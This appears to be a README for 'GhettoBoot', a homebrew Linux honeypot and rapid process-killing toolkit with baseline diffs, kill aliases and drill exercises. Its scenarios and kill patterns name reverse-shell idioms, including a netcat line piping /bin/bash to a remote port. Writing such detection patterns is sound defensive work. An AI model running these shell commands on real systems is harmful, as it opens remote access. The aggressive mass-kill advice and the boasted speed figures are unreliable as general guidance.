# ⚡ GhettoBoot Operational Quick-Start

**SPEED OPTIMIZED** - Get operational FAST. No complex lookups. Instant detection. Instant kill.

---

## 🚀 5-Minute Operational Setup

### Step 1: Install Everything (30 seconds)

```bash
cd GhettoBoot
chmod +x *.sh
sudo ./install-honeypot.sh
```

### Step 2: Setup Fast Mode (1 minute)

```bash
# Rename root for instant visual ID
sudo ./rename-for-speed.sh setup

# Add aliases to bashrc
cat /tmp/ghettoboot-bashrc.sh >> ~/.bashrc
source ~/.bashrc

# Create baseline (CRITICAL - do this NOW before any attack)
sudo fast-baseline.sh create
```

### Step 3: Enter Battle Mode (30 seconds)

```bash
# Kill all non-essentials for minimal attack surface
sudo pre-shutdown.sh battle

# Start honeypot
sudo honeypot start
```

### Step 4: You're Live! (verification)

```bash
# Quick check - should show all green
psfast

# Verify baseline
sudo fast-baseline.sh check
```

**DONE!** System is operational. Ready for rapid response.

---

## ⚡ Speed Commands (< 1 second each)

### Instant Detection

```bash
psfast          # Color-coded: Green=ours, Red=check it
pc              # Quick baseline check
whatsnew        # What processes are new
```

### Instant Kill

```bash
pk              # Kill all unknowns (ultra fast <0.5s)
kp "nc.*-e"     # Kill by pattern (e.g., netcat backdoor)
```

### Continuous Monitoring

```bash
pw              # Watch mode (2 second intervals)
```

---

## 🎯 Combat Workflow

### Pre-Attack Preparation

```bash
# 1. Create baseline (when system is clean)
sudo fast-baseline.sh create

# 2. Enter battle mode
sudo pre-shutdown.sh battle

# 3. Start monitoring
sudo fast-baseline.sh watch
```

### During Attack

```bash
# Terminal 1: Monitoring
pw

# Terminal 2: Ready for instant kill
# (watching for red processes in psfast)

# When you see suspicious process:
pk                    # Kill all unknowns instantly
# OR
kp "suspicious.*"     # Kill specific pattern
```

### Post-Attack

```bash
# Check kill log
fast-kill.sh log

# Review what was killed
honeypot alerts

# Exit battle mode (restore services)
sudo pre-shutdown.sh exit
```

---

## 🔥 Visual Identification (The Key)

### User Names

```
BrickRoot   = YOU (good)
root        = ATTACKER? (suspicious if you're logged in as BrickRoot)
```

### Process Names

```
BrickBash, BrickPython, BrickSSH, BrickSudo = YOURS (good)
bash, python, sh                             = CHECK IT (suspicious)
```

### PS Output Color Coding

```bash
psfast   # Shows:
# ✓ Green = Brick* processes (yours)
# ✗ Red   = Everything else (CHECK THESE!)
```

**The Philosophy**: Rename YOUR stuff with "Brick" prefix. Anything without "Brick" = instant red flag.

---

## 🎮 One-Liner Combat Commands

### The Essentials (memorize these)

```bash
# Create baseline (before attack)
sudo fast-baseline.sh create

# Check (during attack)
pc

# Kill unknowns (when compromised)
pk

# Watch continuously
pw

# Enter battle mode
sudo pre-shutdown.sh battle

# Full lockdown
sudo fast-kill.sh killswitch
```

### Advanced One-Liners

```bash
# Find and kill reverse shells
kp "bash.*-i|nc.*-e|/dev/tcp/"

# Find new users
sudo fast-baseline.sh diff-users

# Find new network connections
sudo fast-baseline.sh diff-network

# Nuclear option (kill EVERYTHING except critical)
sudo fast-kill.sh nuke
```

---

## 📋 Operational Checklist

### Pre-Deployment

- [ ] Run `install-honeypot.sh`
- [ ] Run `rename-for-speed.sh setup`
- [ ] Add bashrc additions: `cat /tmp/ghettoboot-bashrc.sh >> ~/.bashrc`
- [ ] **CRITICAL**: Create baseline: `sudo fast-baseline.sh create`
- [ ] Login as BrickRoot (verify you show up as BrickRoot in ps)
- [ ] Test psfast (should see green Brick* processes)

### Daily Operations

- [ ] Update baseline if you install new software: `sudo fast-baseline.sh rebuild`
- [ ] Review kill log: `fast-kill.sh log`
- [ ] Check honeypot alerts: `honeypot alerts`

### When Under Attack

- [ ] Run `psfast` - look for RED processes
- [ ] Run `pc` - check diff
- [ ] If compromised: `pk` (instant kill)
- [ ] If really bad: `sudo fast-kill.sh killswitch`

---

## 🧠 The Speed Philosophy

### Why This is Fast

**Traditional approach:**
```
ps aux | grep suspicious | check against database | analyze | decide | kill
Time: 5-10 seconds (SLOW - you're fucked)
```

**GhettoBoot approach:**
```
Compare current vs baseline → Kill diff
Time: <0.5 seconds (FAST - attacker fucked)
```

### Key Insights

1. **Pre-compute everything** - Baseline created when system is clean
2. **No complex lookups** - Just fast diff (comm command)
3. **Visual identification** - Brick* = instant recognition
4. **One-shot kills** - xargs kill -9 (no mercy)
5. **Minimal attack surface** - Battle mode kills bloat

### Trade-offs

- **Requires baseline** - Must run `create` before attack (small price)
- **Can't add processes during battle** - New legitimate processes will be flagged (acceptable)
- **Aggressive killing** - May kill things you want (better than being pwned)

---

## 🎯 Real-World Scenarios

### Scenario 1: SSH Brute Force → Shell

```bash
# You see in psfast:
# ✗ root     12345  ...  bash -i
# ✗ root     12346  ...  nc 192.168.1.100 4444 -e /bin/bash

# Instant response:
pk

# Result: Both killed in <0.5s
```

### Scenario 2: Process Injection

```bash
# Watch mode running (pw)
# You see:
# NEW PROCESSES DETECTED:
#   PID:54321 USER:www-data CMD:/bin/sh

# Instant kill:
pk

# Or if you want to be specific:
kp "www-data.*sh"
```

### Scenario 3: Privilege Escalation Attempt

```bash
# psfast shows:
# ✗ attacker  12345  ...  sudo -i

# Quick check:
sudo fast-baseline.sh diff-users
# ⚠ NEW USERS DETECTED:
#   → attacker

# Nuke everything:
sudo fast-kill.sh nuke
# Then:
sudo userdel -r attacker
```

---

## 📊 Performance Benchmarks

### Command Speed (average)

```
psfast                  : <0.1s
pc (baseline check)     : <0.3s
pk (kill unknowns)      : <0.5s
pw (watch refresh)      : 2s intervals
fast-baseline.sh create : ~2s
```

### Detection Time

```
Traditional IDS : 5-30 seconds (rule processing, analysis)
GhettoBoot      : <0.5 seconds (instant diff)
```

### Kill Time

```
Traditional     : Manual hunting, multiple commands, 10-60s
GhettoBoot pk   : <0.5 seconds (one command, instant kill)
```

**Result**: You're 100x faster than attacker.

---

## 🛡️ Defense Layers

### Layer 1: Honeypot (Deception)
- Fake WiFi (SpectrumSetup-1A-Plus) → Smiley faces 😊
- Chroot jail → Fake files, fake creds
- SSH → Sandboxed environment

### Layer 2: Fast Detection (This System)
- Baseline diff → <0.5s detection
- Visual ID → Instant recognition
- Continuous monitoring → 2s refresh

### Layer 3: Fast Kill (This System)
- Instant kill unknowns → <0.5s
- Pattern matching → Regex-based targeting
- Killswitch → Full lockdown

### Layer 4: Auto-Recovery
- Breach detection → Threshold-based
- Kill switch → Everything dies
- Auto-reboot → System restores

**All layers working together** = Attacker has maybe 2-3 seconds before detected and killed.

---

## 🔧 Customization

### Add Your Processes to Baseline

```bash
# Install your software
apt-get install myapp

# Rebuild baseline
sudo fast-baseline.sh rebuild
```

### Custom Kill Patterns

Edit `fast-kill.sh` and add to `suspicious_patterns`:
```bash
suspicious_patterns+=(
    "your-suspicious-pattern"
)
```

### Adjust Battle Mode

Edit `pre-shutdown.sh` and customize:
```bash
NON_ESSENTIAL_SERVICES+=(
    "your-bloatware-service"
)
```

---

## 📱 Quick Reference Card

```
╔════════════════════════════════════════════════════════╗
║         GHETTOBOOT SPEED COMMANDS                      ║
╠════════════════════════════════════════════════════════╣
║ psfast          │ Color-coded process list             ║
║ pc              │ Quick baseline check                 ║
║ pk              │ Kill all unknowns (FAST)             ║
║ pw              │ Watch mode (continuous)              ║
║ kp <pattern>    │ Kill by pattern                      ║
║ whatsnew        │ What's new since baseline            ║
║ cheat           │ Show full reference                  ║
╠════════════════════════════════════════════════════════╣
║ VISUAL ID:                                             ║
║   Brick*  = YOURS (green)                              ║
║   Other   = CHECK IT (red)                             ║
╚════════════════════════════════════════════════════════╝
```

---

## ⚠️ Important Notes

1. **CREATE BASELINE FIRST** - Everything depends on it
2. **Update baseline** after installing software
3. **Battle mode** disables services - may affect functionality
4. **Aggressive killing** - May kill legitimate processes if not in baseline
5. **Login as BrickRoot** for proper visual ID
6. **No complex algorithms** - Just fast diffs (this is a feature)

---

## 🎓 Training Exercises

### Exercise 1: Detection Speed Test

```bash
# Terminal 1: Start watch
pw

# Terminal 2: Simulate attack
bash -i

# How fast did you see it? Should be <2 seconds
```

### Exercise 2: Kill Speed Test

```bash
# Start rogue process
sleep 10000 &

# How fast can you kill it?
pk

# Should be <0.5s from decision to death
```

### Exercise 3: Full Combat Simulation

```bash
# 1. Clean system - create baseline
sudo fast-baseline.sh create

# 2. Simulate attack
bash -i &
nc -l 4444 &

# 3. Detect (should show in psfast as red)
psfast

# 4. Kill
pk

# Time yourself: How long from step 3 to step 4?
# Goal: <5 seconds total
```

---

## 📞 Emergency Commands

```bash
# System compromised - FULL LOCKDOWN
sudo fast-kill.sh killswitch

# Manual breach response
sudo breach-kill-switch.sh activate

# Reboot with honeypot intact
sudo reboot
```

---

**Remember:** Speed is your advantage. Complex = Slow = Dead. Simple = Fast = Win.

**Philosophy:** "If I can't identify it in <1 second, I kill it."

Now get operational and fuck up some attackers! ⚡
